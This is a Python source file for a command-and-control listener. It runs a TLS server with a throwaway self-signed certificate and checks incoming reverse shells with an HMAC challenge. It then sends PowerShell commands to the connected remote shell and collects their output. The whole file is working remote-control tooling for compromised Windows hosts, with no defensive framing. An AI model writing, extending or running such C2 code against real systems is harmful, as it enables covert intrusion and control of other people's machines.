"""
C2 Listener Module - Handles TLS socket, handshake, and ShellManager
"""

import socket
import ssl
import hmac
import hashlib
import tempfile
import subprocess
import random
import string
from rich.console import Console

console = Console()


def generate_self_signed_cert():
    """Generate ephemeral self-signed certificate for TLS encryption."""
    cert_dir = tempfile.mkdtemp()
    key_file = f"{cert_dir}/server.key"
    cert_file = f"{cert_dir}/server.crt"
    
    subprocess.run([
        "openssl", "req", "-x509", "-newkey", "rsa:2048",
        "-keyout", key_file, "-out", cert_file,
        "-days", "1", "-nodes", "-batch",
        "-subj", "/CN=localhost"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    return cert_file, key_file


class ShellManager:
    """Manages the TLS-encrypted shell connection with HMAC handshake."""
    
    def __init__(self, config):
        self.config = config
        self.sock = None
        self.conn = None
        self.ssl_context = None
        self.connected = False
        self.challenge = None
    
    def start_listener(self, port):
        """Start a TLS listener on the specified port."""
        if self.config.cert_file and self.config.key_file:
            cert_file, key_file = self.config.cert_file, self.config.key_file
        else:
            cert_file, key_file = generate_self_signed_cert()
            self.config.cert_file = cert_file
            self.config.key_file = key_file
        
        self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.ssl_context.load_cert_chain(cert_file, key_file)
        
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('0.0.0.0', port))
        self.sock.listen(5)
        
        console.print(f"[green]TLS Listener started on port {port}[/]")
    
    def wait_for_connection(self, timeout=300):
        """Wait for an incoming TLS connection with HMAC handshake."""
        self.sock.settimeout(timeout)
        try:
            client_sock, addr = self.sock.accept()
            console.print(f"[yellow]Connection from {addr[0]}...[/]")
            
            client_sock.settimeout(10)
            
            try:
                self.conn = self.ssl_context.wrap_socket(client_sock, server_side=True)
            except ssl.SSLError as e:
                console.print(f"[red]SSL handshake failed: {e}[/]")
                client_sock.close()
                return False
            except socket.timeout:
                console.print(f"[red]SSL handshake timeout[/]")
                client_sock.close()
                return False
            except Exception as e:
                console.print(f"[red]Connection error: {e}[/]")
                client_sock.close()
                return False
            
            self.challenge = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            self.conn.send(f"CHALLENGE:{self.challenge}\n".encode())
            
            self.conn.settimeout(10)
            response = self.conn.recv(1024).decode().strip()
            
            expected = hmac.new(
                self.config.handshake_secret.encode(),
                self.challenge.encode(),
                hashlib.sha256
            ).hexdigest()
            
            if response != expected:
                console.print(f"[red]Handshake FAILED - invalid response[/]")
                self.conn.close()
                return False
            
            self.connected = True
            console.print(f"[bold green]TLS + HMAC Handshake SUCCESS![/]")
            return True
            
        except socket.timeout:
            return False
    
    def execute(self, cmd):
        """Execute a command on the connected shell."""
        if not self.conn or not self.connected:
            return "[No shell connected]"
        
        try:
            self.conn.setblocking(0)
            try:
                while self.conn.recv(4096):
                    pass
            except BlockingIOError:
                pass
            self.conn.setblocking(1)
            
            delimiter = "---END-CMD-OUTPUT---"
            wrapped_cmd = f"{cmd}; Write-Host '{delimiter}'"
            
            self.conn.send((wrapped_cmd + "\n").encode())
            self.conn.settimeout(30)
            output = ""
            
            while True:
                try:
                    chunk = self.conn.recv(4096).decode(errors='ignore')
                    if not chunk:
                        break
                    output += chunk
                    if delimiter in output:
                        break
                except socket.timeout:
                    break
            
            if delimiter in output:
                output = output.split(delimiter)[0]
            
            lines = output.strip().split('\n')
            cleaned = []
            for line in lines:
                stripped_line = line.strip()
                if stripped_line.startswith("PS") and stripped_line.endswith(">"):
                    continue
                if stripped_line == "PS>":
                    continue
                if cmd.strip() in stripped_line:
                    continue
                cleaned.append(line)
            
            result = '\n'.join(cleaned).strip()
            return result if result else "[No output captured]"
            
        except BrokenPipeError:
            self.connected = False
            return "[Shell disconnected]"
        except Exception as e:
            self.connected = False
            return f"[Error: {e}]"
    
    def close(self):
        if self.conn:
            try:
                self.conn.close()
            except Exception:
                pass
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
